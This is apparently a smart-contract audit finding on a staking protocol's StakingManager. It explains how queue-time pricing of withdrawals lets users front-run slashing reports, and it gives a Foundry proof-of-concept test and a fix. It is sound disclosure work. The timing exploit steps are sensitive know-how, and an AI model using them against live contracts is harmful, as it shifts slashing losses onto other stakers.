  "body": "## Finding description and impact\nIn the StakingManager contract, we generally use a withdrawal delay period (7 days by default) to ensure users cannot quickly exit to avoid penalties when malicious validator behavior is detected. However, there is a critical flaw in the implementation: the HYPE amount to be returned to users is calculated at the time of queuing the withdrawal rather than at the time of confirmation.\n\nThis implementation choice creates a vulnerability where users can front-run slashing events by monitoring dafault oracle which updates every 1 hour and quickly queuing withdrawal requests before the slashing is officially reported through the oracle manager which updates the validator values every 24 hours for the protocol.\n\nThere's a timing issue between Oracle updates and OracleManager updates. The DefaultOracles can update validator metrics every hour (`MIN_UPDATE_INTERVAL = 1 hours` in DefaultOracle.sol), while OracleManager only updates validator performance data every 24 hours (`MIN_UPDATE_INTERVAL = 24 hours` in OracleManager.sol). This creates a large window where users can detect validator misbehavior (through off-chain monitoring) and front-run the on-chain slashing by queuing withdrawals.\n\n```solidity\nuint256 hypeAmount = stakingAccountant.kHYPEToHYPE(postFeeKHYPE);\n```\n\nThis calculation happens when a user queues a withdrawal, not when they confirm it after the delay period. Consequently, the exchange rate used to calculate the HYPE amount is fixed at queue time, and any slashing events that occur during the 7-day waiting period will not affect this user's withdrawal amount.\n\n\n## Impact\n\n1. Users who are monitoring validators / defaultOracles can escape slashing penalties entirely by timing their withdrawals.\n2. Loss for other users as they have to bear the whole slashing amount.\n\n## Recommended mitigation steps\n\nTo fix this vulnerability, the HYPE amount calculation should be moved from queue time to confirmation time. This ensures all users are subject to slashing events that occur during the waiting period and subtract the rewards gained by the validator in those 7 days.",
  "proof_of_concept": "The following test demonstrates how a user can successfully avoid slashing penalties by front-running a slashing event reported by oracleManager:\n\n```solidity\nfunction test_SlashingBypassViaWithdrawal() public {\n        uint256 stakeAmount = 100 ether; //100 HYPE\n        \n        // Setup validator and delegation\n        vm.startPrank(manager);\n        validatorManager.activateValidator(validator);\n        validatorManager.setDelegation(address(stakingManager), validator);\n        stakingManager.setMaxStakeAmount(0);\n        vm.stopPrank();\n        \n        // Create two users who will stake the same amount\n        address user1 = makeAddr(\"user1\");\n        address user2 = makeAddr(\"user2\");\n        \n        // Both users stake the same amount\n        vm.deal(user1, stakeAmount);\n        vm.prank(user1);\n        stakingManager.stake{value: stakeAmount}();\n        \n        vm.deal(user2, stakeAmount);\n        vm.prank(user2);\n        stakingManager.stake{value: stakeAmount}();\n        \n        // User1: queue withdrawal right before slashing(Time in between where oracleAdapter updates the slashing but oracleManager is not updated yet)\n        vm.prank(user1);\n        kHYPE.approve(address(stakingManager), stakeAmount);\n        vm.prank(user1);\n        stakingManager.queueWithdrawal(stakeAmount);\n\n        // Add ETH to the StakingManager contract to process both withdrawals\n        vm.deal(address(stakingManager), stakeAmount * 2);\n        \n        // User1 initial withdrawal amount before slashing\n        StakingManager.WithdrawalRequest memory user1Request = stakingManager.withdrawalRequests(user1, 0);\n        uint256 withdrawalAmountBefore = user1Request.hypeAmount;\n        \n        // Slashing happens Within the 7 days of withdrawal (30% of stake is slashed)\n        uint256 slashAmount = 60 ether; // 30% of total staked (200 ether(HYPE))\n        vm.prank(address(oracleManager));\n        validatorManager.reportSlashingEvent(validator, slashAmount);\n        \n        // Fast forward to after the withdrawal delay\n        vm.warp(block.timestamp + stakingManager.withdrawalDelay() + 1);\n        \n        // Both users confirm their withdrawals\n        vm.prank(user1);\n        stakingManager.confirmWithdrawal(0);\n\n        // User2 queues withdrawal after slashing\n        vm.prank(user2);\n        kHYPE.approve(address(stakingManager), stakeAmount);\n        vm.prank(user2);\n        stakingManager.queueWithdrawal(stakeAmount);\n\n        vm.warp(block.timestamp + stakingManager.withdrawalDelay() + 1);\n        \n        // Save the withdrawal amount after slashing\n        StakingManager.WithdrawalRequest memory user2request = stakingManager.withdrawalRequests(user2, 0);\n        uint256 withdrawalAmountAfter = user2request.hypeAmount;\n        \n        vm.prank(user2);\n        stakingManager.confirmWithdrawal(0);\n        \n        // User1's withdrawal amount should be higher than User2's \n        assertGt(withdrawalAmountBefore, withdrawalAmountAfter, \"User1 should get more HYPE than User2\");\n        \n        // Verify that User1 effectively avoided the slashing penalty\n        console.log(\"User1 withdrawal amount (before slashing):\", withdrawalAmountBefore);\n        console.log(\"User2 withdrawal amount (after slashing):\", withdrawalAmountAfter);\n        console.log(\"Difference:\", withdrawalAmountBefore - withdrawalAmountAfter);\n    }\n```\n\nTo run this test:\n\n1. Add this function to the `StakingManager.t.sol` test file\n2. Run the test with: `forge test --match-test test_SlashingBypassViaWithdrawal -vvvv`\n\nThe test shows that User1, who queues a withdrawal before the slashing event reported by oracle manager, receives significantly more HYPE than User2, who queues after the claim of the User1 request. User1 effectively bypasses the slashing penalty, receiving their full staked amount (minus the small unstake fee), while User2 bears a greater portion of the slashing penalty(In this case whole slahsing amount of 60 ETH(HYPE)).",
